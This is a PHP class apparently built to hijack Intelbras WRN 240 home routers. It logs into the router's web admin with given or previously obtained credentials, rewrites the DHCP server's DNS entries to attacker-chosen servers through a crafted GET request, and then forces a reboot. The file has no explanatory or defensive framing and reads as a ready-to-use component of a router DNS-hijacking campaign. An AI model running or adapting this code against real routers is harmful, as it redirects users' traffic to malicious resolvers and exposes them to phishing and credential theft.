<?php



class intelbraswrn240
{

    private $ch;
    public $Host;
    public $User;
    public $Pass;
    public $Auth;
    public $Exploited;

    function GetStr($string, $start, $end)
    {
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }



    function __construct()
    {
        $this->ch 		= curl_init();
        $this->Auth		= false;
    }

    public function Login($Host,$User,$Pass)
    {
        @unlink("cookie.txt");
        if ($this->Exploited == true) {
            $User = $this->User;
            $Pass = $this->Pass;
        }
        $this->ch = curl_init();
        curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/LoginCheck");
        curl_setopt($this->ch, CURLOPT_HEADER, 1);
        curl_setopt($this->ch, CURLOPT_POST, 1);
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, "Username={$User}&checkEn=0&Password={$Pass}");
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
        curl_setopt($this->ch, CURLOPT_COOKIEJAR,"cookie.txt");
        curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT ,8);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 8);
        $headers = array();
        $headers[] = "Accept-Encoding: gzip, deflate";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";

        $headers[] = "Referer: http://{$Host}/login.asp";
        $headers[] = "Connection: keep-alive";
        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($this->ch);		//echo $result;
        $Status = (strpos($result,"login.asp") == false) ? true : false;
        if ($Status)
        {
            //
            $this->Host = $Host;
            $this->User = $User;
            $this->Pass = $Pass;
            $this->Auth = $Status;
        }
        return $Status;
    }






    public function ChangeDNS($Host,$User,$Pass,$DNS1,$DNS2)
    {
        if ($this->Auth)
        {
            //$this->ch = curl_init();
            curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=10.0.0.100&ip2=10.0.0.199&Lease=120&gateway=10.0.0.1&domain=&dnsserver={$DNS1}&dnsserver2={$DNS2}&Save=Salvar");
            curl_setopt($this->ch, CURLOPT_HEADER, 1);
            curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
            curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
            $headers = array();
            $headers[] = "Accept-Encoding: gzip, deflate";
            $headers[] = "Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "Referer: http://{$Host}/wan_dns.asp";
            $headers[] = "Connection: keep-alive";
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
            $result = curl_exec($this->ch);
            echo $result;
        }
        return true;

    }

    public function DoOthers($Host,$User,$Pass)
    {

        if ($this->Auth)
        {
            curl_setopt($this->ch, CURLOPT_URL, "http://{$Host}/userRpm/SysRebootRpm.htm?Reboot=Reiniciar");
            curl_setopt($this->ch, CURLOPT_HEADER, 1);
            curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($this->ch, CURLOPT_ENCODING, 'gzip, deflate');
            curl_setopt($this->ch, CURLOPT_USERPWD, $User. ":" . $Pass);
            $headers = array();
            $headers[] = "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            $headers[] = "Accept-Language: en-US,en;q=0.5";
            $headers[] = "If-Modified-Since: 0";
            $headers[] = "Referer: http://{$Host}/system_reboot.asp";
            $headers[] = "Cookie: language=pt; admin:language=pt";
            $headers[] = "Connection: keep-alive";
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $headers);
            $result = curl_exec($this->ch);

        }
        @unlink("cookies.txt");
    }









}


